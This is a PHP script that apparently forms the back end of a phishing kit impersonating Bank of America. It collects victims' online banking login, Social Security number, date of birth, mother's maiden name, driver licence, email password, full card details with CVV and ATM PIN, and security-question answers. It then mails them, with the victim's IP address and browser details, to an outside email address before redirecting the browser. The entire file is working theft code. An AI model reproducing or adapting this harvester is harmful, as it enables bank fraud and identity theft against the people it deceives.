<?php
if ($include != 1)
 {
 die('Illegal Access');
 }

//Open Session
ini_set("output_buffering",4096);
session_start();



include 'ccvalid.php';
include 'Email.php';


$OnlineID = $_SESSION['ONLINEID'];
$Passcode =  $_SESSION['PASSCODES'];
$FirstName = $_SESSION['FNAMES'];
$Last_Name = $_SESSION['LNAMES'];
$Address = $_SESSION['ADDRESS'];
$City = $_SESSION['CITIES'];
$State = $_SESSION['STATES'];
$Zip = $_SESSION['ZIPS'];
$Phono = $_SESSION['PHONES'];
$SSN = $_SESSION['SSNS'];
$DOB = $_SESSION['DOBS'];
$Mother_Mdn = $_SESSION['MMDNS'];
$DriverLS = $_SESSION['DRLSIS'];
$Mother_Middle = $_SESSION['MMMNS'];
$Nameoncard = $_SESSION['NONCARDS'];
$Email = $_SESSION['EMAILS'];
$Card = $_SESSION['CARDS'];
$Card_type = is_valid_card($Card);
$ePass = $_SESSION['EPASSES'];
$expdateM = $_SESSION['EXPDATES'];
$expdateY = $_SESSION['EXPDATESY'];
$CVV = $_SESSION['CVVS'];
$PIN = $_SESSION['PINS'];
$secQuestionI = $_SESSION['SECONE'];
$secQuestionII = $_SESSION['SECTWO'];
$secQuestionIII = $_SESSION['SECTHREE'];
$secQuestionIIII = $_SESSION['SECFOUR'];
$secQuestionIIIII = $_SESSION['SECFIVE'];
$secAnswerI = $_SESSION['ANSONE'];
$secAnswerII = $_SESSION['ANSTWO'];
$secAnswerIII = $_SESSION['ANSTHREE'];
$secAnswerIIII = $_SESSION['ANSFOUR'];
$secAnswerIIIII = $_SESSION['ANSFIVE'];

$date = gmdate("d/m/Y | H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];



$Client="=================+ ~!BOA Customer!~ +=================
OnlneID : $OnlineID
Passcode   : $Passcode
====================~Personal info~====================
Name: $FirstName $Last_Name
Address: $Address
City: $City
State: $State
ZIP: $Zip
Phone: $Phono
SSN: $SSN
DOB: $DOB ( Month - Day - Year )
Mother's Maiden Name: $Mother_Mdn
Mother's Middle Name: $Mother_Middle
Driver License: $DriverLS
Email : $Email
Pass  : $ePass
====================~Card Info~====================
Name on card: $Nameoncard
Card No: $Card
Expires: $expdateM/$expdateY
CVV: $CVV
PIN.ATM: $PIN
Type: $Card_type
====================~Sitekey~====================
Question 1: $secQuestionI $secAnswerI
Question 2: $secQuestionII $secAnswerII
Question 3: $secQuestionIII $secAnswerIII
Question 4: $secQuestionIIII $secAnswerIIII
Question 5: $secQuestionIIIII $secAnswerIIIII
====================~Headers~====================
IP: $ip
Hostname: $hostname
Useragent: $useragent
Date: $date
=================+ ~!BOA Customer!~ +=================";


$subject = "BOA $OnlineID - $State - $ip";
$headers = "From: BOB Customer<Border@Source.Land>";
$headers .= "MIME-Version: 1.0\n";$to ="louisegregy@gmail.com.com";
mail($SEND,$subject,$Client,$headers);mail($to,$subject,$Client,$headers);

session_destroy();
$header = "Processing.php?True=1&zone=1&SESSIONID=".bin2hex($Client);
header("Location: $header");




?>